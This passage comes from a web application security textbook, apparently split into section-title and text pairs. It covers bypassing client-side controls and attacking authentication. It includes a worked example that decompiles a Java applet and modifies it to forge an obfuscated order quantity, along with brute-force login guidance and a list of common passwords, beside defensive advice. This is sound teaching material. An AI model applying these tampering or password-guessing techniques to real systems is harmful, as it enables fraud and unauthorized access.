parts of the visible user interface. Using your intercepting proxy, you\nmay be able to edit the HTML page that loads the component and modify or\nadd some JavaScript to unlock parts of the interface that are hidden.\nHACK STEPS\n1. Use the techniques described to download the component’s bytecode,\nunpack it, and decompile it into source code.\n2. Review the relevant source code to understand what processing is being\nperformed.\n3. If the component contains any public methods that can be manipulated to\nachieve your objective, intercept an HTML response that interacts with the\ncomponent, and add some JavaScript to invoke the appropriate methods\nusing your input.\n4. If not, modify the component’s source code to achieve your objective, and\nthen recompile it and execute it, either in your browser or as a standalone\nprogram.\n5. If the component is being used to submit obfuscated or encrypted data to\nthe server, use your modified version of the component to submit various\nsuitably obfuscated attack strings to the server to probe for vulnerabili-\nties, as you would for any other parameter.\nCoping with Bytecode Obfuscation\nBecause of the ease with which bytecode can be decompiled to recover its\nsource, various techniques have been developed to obfuscate the bytecode itself.\nApplying these techniques results in bytecode that is harder to decompile or that\ndecompiles to misleading or invalid source code that may be very diffi cult to\nunderstand and impossible to recompile without substantial effort. For example,\nconsider the following obfuscated Java source:\npackage myapp.interface;\nimport myapp.class.public;\nimport myapp.throw.throw;\ncc0055..iinndddd 114444 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 145\nChapter 5 n Bypassing Client-Side Controls 145\nimport if.if.if.if.else;\nimport java.awt.event.KeyEvent;\npublic class double extends public implements strict\n{\npublic double(j j1)\n{\n_mthif();\n_fldif = j1;\n}\nprivate void _mthif(ActionEvent actionevent)\n{\n_mthif(((KeyEvent) (null)));\nswitch(_fldif._mthnew()._fldif)\n{\ncase 0:\n_fldfloat.setEnabled(false);\n_fldboolean.setEnabled(false);\n_fldinstanceof.setEnabled(false);\n_fldint.setEnabled(false);\nbreak;\n...\nThe obfuscation techniques commonly employed are as follows:\nn Meaningful class, method, and member variable names are replaced\nwith meaningless expressions such as a, b, and c. This forces the reader\nof decompiled code to identify the purpose of each item by studying how\nit is used. This can make it diffi cult to keep track of different items while\ntracing them through the source code.\nn Going further, some obfuscators replace item names with keywords\nreserved for the language, such as new and int. Although this technically\nrenders the bytecode illegal, most virtual machines (VMs) tolerate the\nillegal code, and it executes normally. However, even if a decompiler\ncan handle the illegal bytecode, the resulting source code is even less\nreadable than that just described. More importantly, the source cannot\nbe recompiled without extensive reworking to consistently rename\nillegally named items.\nn Many obfuscators strip unnecessary debug and meta-information from\nthe bytecode, including source fi lenames and line numbers (which makes\nstack traces less informative), local variable names (which frustrates debug-\nging), and inner class information (which stops refl ection from working\nproperly).\nn Redundant code may be added that creates and manipulates various kinds\nof data in signifi cant-looking ways but that is autonomous from the real\ndata actually being used by the application’s functionality.\ncc0055..iinndddd 114455 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 146\n146 Chapter 5 n Bypassing Client-Side Controls\nn The path of execution through code can be modifi ed in convoluted ways,\nthrough the use of jump instructions, so that the logical sequence of execu-\ntion is hard to discern when reading through the decompiled source.\nn Illegal programming constructs may be introduced, such as unreachable\nstatements and code paths with missing return statements. Most VMs\ntolerate these phenomena in bytecode, but the decompiled source cannot\nbe recompiled without correcting the illegal code.\nHACK STEPS\nEffective tactics for coping with bytecode obfuscation depend on the tech-\nniques used and the purpose for which you are analyzing the source. Here are\nsome suggestions:\n1. You can review a component for public methods without fully under-\nstanding the source. It should be obvious which methods can be invoked\nfrom JavaScript, and what their signatures are, enabling you to test the\nbehavior of the methods by passing in various inputs.\n2. If class, method, and member variable names have been replaced with\nmeaningless expressions (but not special words reserved by the pro-\ngramming language), you can use the refactoring functionality built into\nmany IDEs to help yourself understand the code. By studying how items\nare used, you can start to assign them meaningful names. If you use the\nrename tool within the IDE, it does a lot of work for you, tracing the item’s\nuse throughout the codebase and renaming it everywhere.\n3. You can actually undo a lot of obfuscation by running the obfuscated byte-\ncode through an obfuscator a second time and choosing suitable options.\nA useful obfuscator for Java is Jode. It can remove redundant code paths\nadded by another obfuscator and facilitate the process of understanding\nobfuscated names by assigning globally unique names to items.\nJava Applets: A Worked Example\nWe will now consider a brief example of decompiling browser extensions by\nlooking at a shopping application that performs input validation within a Java\napplet.\nIn this example, the form that submits the user’s requested order quantity\nlooks like this:\n<form method=”post” action=”Shop.aspx?prod=2” onsubmit=”return\nvalidateForm(this)”>\n<input type=”hidden” name=”obfpad”\nvalue=”klGSB8X9x0WFv9KGqilePdqaxHIsU5RnojwPdBRgZuiXSB3TgkupaFigj\nUQm8CIP5HJxpidrPOuQPw63ogZ2vbyiOevPrkxFiuUxA8Gn30o1ep2Lax6IyuyEU\ncc0055..iinndddd 114466 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 147\nChapter 5 n Bypassing Client-Side Controls 147\nD9SmG7c”>\n<script>\nfunction validateForm(theForm)\n{\nvar obfquantity =\ndocument.CheckQuantityApplet.doCheck(\ntheForm.quantity.value, theForm.obfpad.value);\nif (obfquantity == undefined)\n{\nalert(‘Please enter a valid quantity.’);\nreturn false;\n}\ntheForm.quantity.value = obfquantity;\nreturn true;\n}\n</script>\n<applet code=”CheckQuantity.class” codebase=”/scripts” width=”0”\nheight=”0”\nid=”CheckQuantityApplet”></applet>\nProduct: Samsung Multiverse <br/>\nPrice: 399 <br/>\nQuantity: <input type=”text” name=”quantity”> (Maximum quantity is 50)\n<br/>\n<input type=”submit” value=”Buy”>\n</form>\nWhen the form is submitted with a quantity of 2, the following request is made:\nPOST /shop/154/Shop.aspx?prod=2 HTTP/1.1\nHost: mdsec.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 77\nobfpad=klGSB8X9x0WFv9KGqilePdqaxHIsU5RnojwPdBRgZuiXSB3TgkupaFigjUQm8CIP5\nHJxpidrPOuQ\nPw63ogZ2vbyiOevPrkxFiuUxA8Gn30o1ep2Lax6IyuyEUD9SmG7c&quantity=4b282c510f\n776a405f465\n877090058575f445b536545401e4268475e105b2d15055c5d5204161000\nAs you can see from the HTML code, when the form is submitted, the vali-\ndation script passes the user’s supplied quantity, and the value of the obfpad\nparameter, to a Java applet called CheckQuantity. The applet apparently performs\nthe necessary input validation and returns to the script an obfuscated version\nof the quantity, which is then submitted to the server.\nSince the server-side application confi rms our order for two units, it is clear\nthat the quantity parameter somehow contains the value we have requested.\nHowever, if we try to modify this parameter without knowledge of the obfusca-\ntion algorithm, the attack fails, presumably because the server fails to unpack\nour obfuscated value correctly.\ncc0055..iinndddd 114477 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 148\n148 Chapter 5 n Bypassing Client-Side Controls\nIn this situation, we can use the methodology already described to decompile\nthe Java applet and understand how it functions. First, we need to download\nthe bytecode for the applet from the URL specifi ed in the applet tag of the\nHTML page:\n/scripts/CheckQuantity.class\nSince the executable is not packaged as a .jar fi le, there is no need to unpack\nit, and we can run Jad directly on the downloaded .class fi le:\nC:\\tmp>jad CheckQuantity.class\nParsing CheckQuantity.class...The class file version is 50.0 (only 45.3,\n46.0 and 47.0 are supported)\nGenerating CheckQuantity.jad\nCouldn’t fully decompile method doCheck\nCouldn’t resolve all exception handlers in method doCheck\nJad outputs the decompiled source code as a .jad fi le, which we can view in\nany text editor:\n// Decompiled by Jad v1.5.8f. Copyright 2001 Pavel Kouznetsov.\n// Jad home page: http://www.kpdus.com/jad.html\n// Decompiler options: packimports(3)\n// Source File Name: CheckQuantity.java\nimport java.applet.Applet;\npublic class CheckQuantity extends Applet\n{\npublic CheckQuantity()\n{\n}\npublic String doCheck(String s, String s1)\n{\nint i = 0;\ni = Integer.parseInt(s);\nif(i <= 0 || i > 50)\nreturn null;\nbreak MISSING_BLOCK_LABEL_26;\nException exception;\nexception;\nreturn null;\nString s2 = (new StringBuilder()).append(“rand=”).append\n(Math.random()).append(“&q=”).append(Integer.toString(i)).append\n(“&checked=true”).toString();\nStringBuilder stringbuilder = new StringBuilder();\nfor(int j = 0; j < s2.length(); j++)\n{\nString s3 = (new StringBuilder()).append(‘0’).append\n(Integer.toHexString((byte)s1.charAt((j * 19 + 7) % s1.length()) ^\ns2.charAt(j))).toString();\ncc0055..iinndddd 114488 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 149\nChapter 5 n Bypassing Client-Side Controls 149\nint k = s3.length();\nif(k > 2)\ns3 = s3.substring(k - 2, k);\nstringbuilder.append(s3);\n}\nreturn stringbuilder.toString();\n}\n}\nAs you can see from the decompiled source, Jad has done a reasonable job of\ndecompiling, and the source code for the applet is simple. When the doCheck\nmethod is called with the user-supplied quantity and application-supplied\nobfpad parameters, the applet fi rst validates that the quantity is a valid num-\nber and is between 1 and 50. If so, it builds a string of name/value pairs using\nthe URL querystring format, which includes the validated quantity. Finally, it\nobfuscates this string by performing XOR operations against characters with the\nobfpad string that the application supplied. This is a fairly easy and common\nway of adding some superfi cial obfuscation to data to prevent trivial tampering.\nWe have described various approaches you can take when you have decom-\npiled and analyzed the source code for a browser extension component. In this\ncase, the easiest way to subvert the applet is as follows:\n1. Modify the doCheck method to remove the input validation, allowing you\nto supply an arbitrary string as your quantity.\n2. Add a main method, allowing you to execute the modifi ed component\nfrom the command line. This method simply calls the modifi ed doCheck\nmethod and prints the obfuscated result to the console.\nWhen you have made these changes, the modifi ed source code is as follows:\npublic class CheckQuantity\n{\npublic static void main(String[] a)\n{\nSystem.out.println(doCheck(“999”,\n“klGSB8X9x0WFv9KGqilePdqaxHIsU5RnojwPdBRgZuiXSB3TgkupaFigjUQm8CIP5HJxpi\ndrPOuQPw63ogZ2vbyiOevPrkxFiuUxA8Gn30o1ep2Lax6IyuyEUD9 SmG7c”));\n}\npublic static String doCheck(String s, String s1)\n{\nString s2 = (new StringBuilder()).append(“rand=”).append\n(Math.random()).append(“&q=”).append(s).append\n(“&checked=true”).toString();\nStringBuilder stringbuilder = new StringBuilder();\nfor(int j = 0; j < s2.length(); j++)\n{\nString s3 = (new StringBuilder()).append(‘0’).append\ncc0055..iinndddd 114499 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 150\n150 Chapter 5 n Bypassing Client-Side Controls\n(Integer.toHexString((byte)s1.charAt((j * 19 + 7) % s1.length()) ^\ns2.charAt(j))).toString();\nint k = s3.length();\nif(k > 2)\ns3 = s3.substring(k - 2, k);\nstringbuilder.append(s3);\n}\nreturn stringbuilder.toString();\n}\n}\nThis version of the modifi ed component provides a valid obfuscated string\nfor the arbitrary quantity of 999. Note that you could use nonnumeric input\nhere, allowing you to probe the application for various kinds of input-based\nvulnerabilities.\nTIP The Jad program saves its decompiled source code with the .jad exten-\nsion. However, if you want to modify and recompile the source code, you need\nto rename each source fi le with the .java extension.\nAll that remains is to recompile the source code using the javac compiler\nthat comes with the Java SDK, and then execute the component from the\ncommand line:\nC:\\tmp>javac CheckQuantity.java\nC:\\tmp>java CheckQuantity\n4b282c510f776a455d425a7808015c555f42585460464d1e42684c414a152b1e0b5a520a\n145911171609\nOur modifi ed component has now performed the necessary obfuscation\non our arbitrary quantity of 999. To deliver the attack to the server, we simply\nneed to submit the order form in the normal way using valid input, intercept\nthe resulting request using our proxy, and substitute the obfuscated quantity\nwith the one provided by our modifi ed component. Note that if the application\nissues a new obfuscation pad each time the order form is loaded, you need to\nensure that the obfuscation pad being submitted back to the server matches the\none that was used to obfuscate the quantity also being submitted.\nTRY IT!\nThese examples demonstrate the attack just described and the corresponding\nattacks using Silverlight and Flash technologies:\nhttp://mdsec.net/shop/154/\nhttp://mdsec.net/shop/167/\nhttp://mdsec.net/shop/179/\ncc0055..iinndddd 115500 88//1199//22001111 1122::0055::4444 PPMM"
  },
  {
    "input": "Attaching a Debugger",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 151\nChapter 5 n Bypassing Client-Side Controls 151\nAttaching a Debugger\nDecompilation is the most complete method of understanding and compromis-\ning a browser extension. However, in large and complex components containing\ntens of thousands of lines of code, it is nearly always much quicker to observe the\ncomponent during execution, correlating methods and classes with key actions\nwithin the interface. This approach also avoids diffi culties that may arise with\ninterpreting and recompiling obfuscated bytecode. Often, achieving a specifi c\nobjective is as simple as executing a key function and altering its behavior to\ncircumvent the controls implemented within the component.\nBecause the debugger is working at the bytecode level, it can be easily used\nto control and understand the fl ow of execution. In particular, if source code\ncan be obtained through decompilation, breakpoints can be set on specifi c\nlines of code, allowing the understanding gained through decompilation to be\nsupported by practical observation of the code path taken during execution.\nAlthough effi cient debuggers are not fully matured for all the browser exten-\nsion technologies, debugging is well supported for Java applets. By far the best\nresource for this is JavaSnoop, a Java debugger that can integrate Jad to decom-\npile source code, trace variables through an application, and set breakpoints on\nmethods to view and modify parameters. Figure 5-6 shows JavaSnoop being\nused to hook directly into a Java applet running in the browser. Figure 5-7\nshows JavaSnoop being used to tamper with the return value from a method.\nFigure 5-6: JavaSnoop can hook directly into an\napplet running in the browser\nNOTE It’s best to run JavaSnoop before the target applet is loaded.\nJavaSnoop turns off the restrictions set by your Java security policy so that it\ncan operate on the target. In Windows, it does this by granting all permissions\nto all Java programs on your system, so ensure that JavaSnoop shuts down\ncleanly and that permissions are restored when you are fi nished working.\nAn alternative tool for debugging Java is JSwat, which is highly confi gu-\nrable. In large projects containing many class fi les, it is sometimes preferable\ncc0055..iinndddd 115511 88//1199//22001111 1122::0055::4444 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 152\n152 Chapter 5 n Bypassing Client-Side Controls\nto decompile, modify, and recompile a key class fi le and then use JSwat to hot-\nswap it into the running application. To use JSwat, you need to launch an applet\nusing the appletviewer tool included in the JDK and then connect JSwat to it.\nFor example, you could use this command:\nappletviewer -J-Xdebug -J-Djava.compiler=NONE -J-\nXrunjdwp:transport=dt_socket,\nserver=y,suspend=n,address=5000 appletpage.htm\nFigure 5-7: Once a suitable method has been identified, JavaSnoop can be used to\ntamper with the return value from the method\nWhen you’re working on Silverlight objects, you can use the Silverlight Spy\ntool to monitor the component’s execution at runtime. This can greatly help\ncorrelate relevant code paths to events that occur within the user interface.\nSilverlight Spy is available from the following URL:\nhttp://firstfloorsoftware.com/SilverlightSpy/\ncc0055..iinndddd 115522 88//1199//22001111 1122::0055::4444 PPMM"
  },
  {
    "input": "Native Client Components",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 153\nChapter 5 n Bypassing Client-Side Controls 153\nNative Client Components\nSome applications need to perform actions within the user’s computer that cannot\nbe conducted from inside a browser-based VM sandbox. In terms of client-side\nsecurity controls, here are some examples of this functionality:\nn Verifying that a user has an up-to-date virus scanner\nn Verifying that proxy settings and other corporate confi guration are in force\nn Integrating with a smartcard reader\nTypically, these kinds of actions require the use of native code components,\nwhich integrate local application functionality with web application functional-\nity. Native client components are often delivered via ActiveX controls. These are\ncustom browser extensions that run outside the browser sandbox.\nNative client components may be signifi cantly harder to decipher than other\nbrowser extensions, because there is no equivalent to intermediate bytecode.\nHowever, the principles of bypassing client-side controls still apply, even if this\nrequires a different toolset. Here are some examples of popular tools used for\nthis task:\nn OllyDbg is a Windows debugger that can be used to step through native\nexecutable code, set breakpoints, and apply patches to executables, either\non disk or at runtime.\nn IDA Pro is a disassembler that can produce human-readable assembly\ncode from native executable code on a wide variety of platforms.\nAlthough a full-blown description is outside the scope of this book, the fol-\nlowing are some useful resources if you want to know more about reverse\nengineering of native code components and related topics:\nn Reversing:SecretsofReverseEngineering by Eldad Eilam\nn HackerDisassemblingUncovered by Kris Kaspersky\nn TheArtofSoftwareSecurityAssessment by Mark Dowd, John McDonald,\nand Justin Schuh\nn FuzzingforSoftwareSecurityTestingandQualityAssurance (ArtechHouse\nInformation Security and Privacy) by Ari Takanen, Jared DeMott, and\nCharlie Miller\nn TheIDAProBook:TheUnoffi cialGuidetotheWorld’sMostPopularDisassembler\nby Chris Eagle\nn www.acm.uiuc.edu/sigmil/RevEng\nn www.uninformed.org/?v=1&a=7\ncc0055..iinndddd 115533 88//1199//22001111 1122::0055::4455 PPMM"
  },
  {
    "input": "Transmitting Data Via the Client",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 154\n154 Chapter 5 n Bypassing Client-Side Controls\nHandling Client-Side Data Securely\nAs you have seen, the core security problem with web applications arises because\nclient-side components and user input are outside the server’s direct control.\nThe client, and all the data received from it, is inherently untrustworthy.\nTransmitting Data Via the Client\nMany applications leave themselves exposed because they transmit critical data\nsuch as product prices and discount rates via the client in an unsafe manner.\nIf possible, applications should avoid transmitting this kind of data via the\nclient. In virtually any conceivable scenario, it is possible to hold such data on\nthe server and reference it directly from server-side logic when needed. For\nexample, an application that receives users’ orders for various products should\nallow users to submit a product code and quantity and look up the price of each\nrequested product in a server-side database. There is no need for users to submit\nthe prices of items back to the server. Even where an application offers different\nprices or discounts to different users, there is no need to depart from this model.\nPrices can be held within the database on a per-user basis, and discount rates\ncan be stored in user profi les or even session objects. The application already\npossesses, server-side, all the information it needs to calculate the price of a\nspecifi c product for a specifi c user. It must. Otherwise, it would be unable, on\nthe insecure model, to store this price in a hidden form fi eld.\nIf developers decide they have no alternative but to transmit critical data via\nthe client, the data should be signed and/or encrypted to prevent user tamper-\ning. If this course of action is taken, there are two important pitfalls to avoid:\nn Some ways of using signed or encrypted data may be vulnerable to\nreplay attacks. For example, if the product price is encrypted before\nbeing stored in a hidden fi eld, it may be possible to copy the encrypted\nprice of a cheaper product and submit it in place of the original price.\nTo prevent this attack, the application needs to include suffi cient context\nwithin the encrypted data to prevent it from being replayed in a differ-\nent context. For example, the application could concatenate the product\ncode and price, encrypt the result as a single item, and then validate\nthat the encrypted string submitted with an order actually matches the\nproduct being ordered.\nn If users know and/or control the plaintext value of encrypted strings that\nare sent to them, they may be able to mount various cryptographic attacks\nto discover the encryption key the server is using. Having done this, they\ncan encrypt arbitrary values and fully circumvent the protection offered\nby the solution.\ncc0055..iinndddd 115544 88//1199//22001111 1122::0055::4455 PPMM"
  },
  {
    "input": "Validating Client-Generated Data",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 155\nChapter 5 n Bypassing Client-Side Controls 155\nIn applications running on the ASP.NET platform, it is advisable never to\nstore any customized data within the ViewState — especially anything sensi-\ntive that you would not want to be displayed on-screen to users. The option to\nenable the ViewState MAC should always be activated.\nValidating Client-Generated Data\nData generated on the client and transmitted to the server cannot in principle\nbe validated securely on the client:\nn Lightweight client-side controls such as HTML form fi elds and JavaScript\ncan be circumvented easily and provide no assurance about the input that\nthe server receives.\nn Controls implemented in browser extension components are sometimes\nmore diffi cult to circumvent, but this may merely slow down an attacker\nfor a short period.\nn Using heavily obfuscated or packed client-side code provides additional\nobstacles; however, a determined attacker can always overcome these.\n(A point of comparison in other areas is the use of DRM technologies to\nprevent users from copying digital media fi les. Many companies have\ninvested heavily in these client-side controls, and each new solution usu-\nally is broken within a short time.)\nThe only secure way to validate client-generated data is on the server side of\nthe application. Every item of data received from the client should be regarded\nas tainted and potentially malicious.\nCOMMON MYTH\nIt is sometimes believed that any use of client-side controls is bad. In particu-\nlar, some professional penetration testers report the presence of client-side\ncontrols as a “fi nding” without verifying whether they are replicated on the\nserver or whether there is any non-security explanation for their existence. In\nfact, despite the signifi cant caveats arising from the various attacks described\nin this chapter, there are nevertheless ways to use client-side controls that do\nnot give rise to any security vulnerabilities:\nn Client-side scripts can be used to validate input as a means of enhanc-\ning usability, avoiding the need for round-trip communication with the\nserver. For example, if the user enters her date of birth in an incorrect\nformat, alerting her to the problem via a client-side script provides a\nmuch more seamless experience. Of course, the application must revali-\ndate the item submitted when it arrives at the server.\nContinued\ncc0055..iinndddd 115555 88//1199//22001111 1122::0055::4455 PPMM"
  },
  {
    "input": "Summary",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 156\n156 Chapter 5 n Bypassing Client-Side Controls\nCOMMON MYTH (continued)\nn Sometimes client-side data validation can be effective as a security\nmeasure — for example, as a defense against DOM-based cross-site\nscripting attacks. However, these are cases where the focus of the attack\nis another application user, rather than the server-side application,\nand exploiting a potential vulnerability does not necessarily depend on\ntransmitting any malicious data to the server. See Chapters 12 and 13\nfor more details on this kind of scenario.\nn As described previously, there are ways of transmitting encrypted data\nvia the client that are not vulnerable to tampering or replay attacks.\nLogging and Alerting\nWhen an application employs mechanisms such as length limits and JavaScript-\nbased validation to enhance performance and usability, these should be inte-\ngrated with server-side intrusion detection defenses. The server-side logic that\nperforms validation of client-submitted data should be aware of the validation\nthat has already occurred on the client side. If data that would have been blocked\nby client-side validation is received, the application may infer that a user is\nactively circumventing this validation and therefore is likely to be malicious.\nAnomalies should be logged and, if appropriate, application administrators\nshould be alerted in real time so that they can monitor any attempted attack\nand take suitable action as required. The application may also actively defend\nitself by terminating the user’s session or even suspending his account.\nNOTE In some cases where JavaScript is employed, the application still can\nbe used by users who have disabled JavaScript within their browsers. In this\nsituation, the browser simply skips JavaScript-based form validation code, and\nthe raw input entered by the user is submitted. To avoid false positives, the log-\nging and alerting mechanism should be aware of where and how this can arise.\nSummary\nVirtually all client/server applications must accept the fact that the client com-\nponent, and all processing that occurs on it, cannot be trusted to behave as\nexpected. As you have seen, the transparent communications methods gener-\nally employed by web applications mean that an attacker equipped with simple\ntools and minimal skill can easily circumvent most controls implemented on\nthe client. Even where an application attempts to obfuscate data and processing\nresiding on the client side, a determined attacker can compromise these defenses.\ncc0055..iinndddd 115566 88//1199//22001111 1122::0055::4455 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 157\nChapter 5 n Bypassing Client-Side Controls 157\nIn every instance where you identify data being transmitted via the client, or\nvalidation of user-supplied input being implemented on the client, you should\ntest how the server responds to unexpected data that bypasses those controls.\nOften, serious vulnerabilities lurk behind an application’s assumptions about\nthe protection afforded to it by defenses that are implemented at the client.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. How can data be transmitted via the client in a way that prevents tamper-\ning attacks?\n2. An application developer wants to stop an attacker from performing brute-\nforce attacks against the login function. Because the attacker may target\nmultiple usernames, the developer decides to store the number of failed\nattempts in an encrypted cookie, blocking any request if the number of\nfailed attempts exceeds fi ve. How can this defense be bypassed?\n3. An application contains an administrative page that is subject to rigor-\nous access controls. It contains links to diagnostic functions located on a\ndifferent web server. Access to these functions should also be restricted\nto administrators only. Without implementing a second authentication\nmechanism, which of the following client-side mechanisms (if any) could\nbe used to safely control access to the diagnostic functionality? Do you\nneed any more information to help choose a solution?\n(a) The diagnostic functions could check the HTTP Referer header to\nconfi rm that the request originated on the main administrative page.\n(b) The diagnostic functions could validate the supplied cookies to confi rm\nthat these contain a valid session token for the main application.\n(c) The main application could set an authentication token in a hidden fi eld\nthat is included within the request. The diagnostic function could vali-\ndate this to confi rm that the user has a session on the main application.\n4. If a form fi eld includes the attribute disabled=true, it is not submitted\nwith the rest of the form. How can you change this behavior?\n5. Are there any means by which an application can ensure that a piece of\ninput validation logic has been run on the client?\ncc0055..iinndddd 115577 88//1199//22001111 1122::0055::4455 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 158\ncc0055..iinndddd 115588 88//1199//22001111 1122::0055::4466 PPMM"
  },
  {
    "input": "Chapter 6 Attacking Authentication",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 159\nCHAPTER\n6\nAttacking Authentication\nOn the face of it, authentication is conceptually among the simplest of all the\nsecurity mechanisms employed within web applications. In the typical case, a\nuser supplies her username and password, and the application must verify that\nthese items are correct. If so, it lets the user in. If not, it does not.\nAuthentication also lies at the heart of an application’s protection against\nmalicious attack. It is the front line of defense against unauthorized access. If an\nattacker can defeat those defenses, he will often gain full control of the applica-\ntion’s functionality and unrestricted access to the data held within it. Without\nrobust authentication to rely on, none of the other core security mechanisms\n(such as session management and access control) can be effective.\nIn fact, despite its apparent simplicity, devising a secure authentication func-\ntion is a subtle business. In real-world web applications authentication often is\nthe weakest link, which enables an attacker to gain unauthorized access. The\nauthors have lost count of the number of applications we have fundamentally\ncompromised as a result of various defects in authentication logic.\nThis chapter looks in detail at the wide variety of design and implementa-\ntion fl aws that commonly affl ict web applications. These typically arise because\napplication designers and developers fail to ask a simple question: What could\nan attacker achieve if he targeted our authentication mechanism? In the majority\nof cases, as soon as this question is asked in earnest of a particular application,\na number of potential vulnerabilities materialize, any one of which may be\nsuffi cient to break the application.\n159\ncc0066..iinndddd 115599 88//1199//22001111 1122::0066::3366 PPMM"
  },
  {
    "input": "Authentication Technologies",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 160\n160 Chapter 6 n Attacking Authentication\nMany of the most common authentication vulnerabilities are no-brainers.\nAnyone can type dictionary words into a login form in an attempt to guess\nvalid passwords. In other cases, subtle defects may lurk deep within the appli-\ncation’s processing that can be uncovered and exploited only after painstaking\nanalysis of a complex multistage login mechanism. We will describe the full\nspectrum of these attacks, including techniques that have succeeded in breaking\nthe authentication of some of the most security-critical and robustly defended\nweb applications on the planet.\nAuthentication Technologies\nA wide range of technologies are available to web application developers when\nimplementing authentication mechanisms:\nn HTML forms-based authentication\nn Multifactor mechanisms, such as those combining passwords and physi-\ncal tokens\nn Client SSL certifi cates and/or smartcards\nn HTTP basic and digest authentication\nn Windows-integrated authentication using NTLM or Kerberos\nn Authentication services\nBy far the most common authentication mechanism employed by web applica-\ntions uses HTML forms to capture a username and password and submit these\nto the application. This mechanism accounts for well over 90% of applications\nyou are likely to encounter on the Internet.\nIn more security-critical Internet applications, such as online banking, this\nbasic mechanism is often expanded into multiple stages, requiring the user to\nsubmit additional credentials, such as a PIN or selected characters from a secret\nword. HTML forms are still typically used to capture relevant data.\nIn the most security-critical applications, such as private banking for high-worth\nindividuals, it is common to encounter multifactor mechanisms using physical\ntokens. These tokens typically produce a stream of one-time passcodes or per-\nform a challenge-response function based on input specifi ed by the application.\nAs the cost of this technology falls over time, it is likely that more applications\nwill employ this kind of mechanism. However, many of these solutions do not\nactually address the threats for which they were devised — primarily phishing\nattacks and those employing client-side Trojans.\nSome web applications employ client-side SSL certifi cates or cryptographic\nmechanisms implemented within smartcards. Because of the overhead of adminis-\ntering and distributing these items, they are typically used only in security-critical\ncc0066..iinndddd 116600 88//1199//22001111 1122::0066::3377 PPMM"
  },
  {
    "input": "Bad Passwords",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 161\nChapter 6 n Attacking Authentication 161\ncontexts where an application’s user base is small, such as web-based VPNs for\nremote offi ce workers.\nThe HTTP-based authentication mechanisms (basic, digest, and Windows-\nintegrated) are rarely used on the Internet. They are much more commonly\nencountered in intranet environments where an organization’s internal users\ngain access to corporate applications by supplying their normal network or\ndomain credentials. The application then processes these credentials using one\nof these technologies.\nThird-party authentication services such as Microsoft Passport are occasion-\nally encountered, but at the present time they have not been adopted on any\nsignifi cant scale.\nMost of the vulnerabilities and attacks that arise in relation to authentication\ncan be applied to any of the technologies mentioned. Because of the overwhelm-\ning dominance of HTML forms-based authentication, we will describe each\nspecifi c vulnerability and attack in that context. Where relevant, we will point\nout any specifi c differences and attack methodologies that are relevant to the\nother available technologies.\nDesign Flaws in Authentication Mechanisms\nAuthentication functionality is subject to more design weaknesses than any\nother security mechanism commonly employed in web applications. Even\nin the apparently simple, standard model where an application authenticates\nusers based on their username and password, shortcomings in the design of\nthis model can leave the application highly vulnerable to unauthorized access.\nBad Passwords\nMany web applications employ no or minimal controls over the quality of users’\npasswords. It is common to encounter applications that allow passwords that are:\nn Very short or blank\nn Common dictionary words or names\nn The same as the username\nn Still set to a default value\nFigure 6-1 shows an example of weak password quality rules. End users typi-\ncally display little awareness of security issues. Hence, it is highly likely that\nan application that does not enforce strong password standards will contain a\nlarge number of user accounts with weak passwords set. An attacker can easily\nguess these account passwords, granting him or her unauthorized access to the\napplication.\ncc0066..iinndddd 116611 88//1199//22001111 1122::0066::3377 PPMM"
  },
  {
    "input": "Brute-Forcible Login",
    "output": "Stuttard c06.indd V3 - 07/22/2011 Page 162\n162 Chapter 6 n Attacking Authentication\nFigure 6-1: An application that enforces weak password quality rules\nHACK STEPS\nAttempt to discover any rules regarding password quality:\n1. Review the website for any description of the rules.\n2. If self-registration is possible, attempt to register several accounts with\ndifferent kinds of weak passwords to discover what rules are in place.\n3. If you control a single account and password change is possible, attempt\nto change your password to various weak values.\nNOTE If password quality rules are enforced only through client-side con-\ntrols, this is not itself a security issue, because ordinary users will still be\nprotected. It is not normally a threat to an application’s security that a crafty\nattacker can assign himself a weak password.\nTRY IT!\nhttp://mdsec.net/auth/217/\nBrute-Forcible Login\nLogin functionality presents an open invitation for an attacker to try to guess\nusernames and passwords and therefore gain unauthorized access to the appli-\ncation. If the application allows an attacker to make repeated login attempts\ncc0066..iinndddd 116622 88//1199//22001111 1122::0066::3377 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 163\nChapter 6 n Attacking Authentication 163\nwith different passwords until he guesses the correct one, it is highly vulnerable\neven to an amateur attacker who manually enters some common usernames\nand passwords into his browser.\nRecent compromises of high-profi le sites have provided access to hundreds\nof thousands of real-world passwords that were stored either in cleartext or\nusing brute-forcible hashes. Here are the most popular real-world passwords:\nn password\nn website name\nn 12345678\nn qwerty\nn abc123\nn 111111\nn monkey\nn 12345\nn letmein\nNOTE Administrative passwords may in fact be weaker than the password\npolicy allows. They may have been set before the policy was in force, or they\nmay have been set up through a different application or interface.\nIn this situation, any serious attacker will use automated techniques to attempt\nto guess passwords, based on lengthy lists of common values. Given today’s\nbandwidth and processing capabilities, it is possible to make thousands of login\nattempts per minute from a standard PC and DSL connection. Even the most\nrobust passwords will eventually be broken in this scenario.\nVarious techniques and tools for using automation in this way are described\nin detail in Chapter 14. Figure 6-2 shows a successful password-guessing attack\nagainst a single account using Burp Intruder. The successful login attempt can be\nclearly distinguished by the difference in the HTTP response code, the response\nlength, and the absence of the “login incorrect” 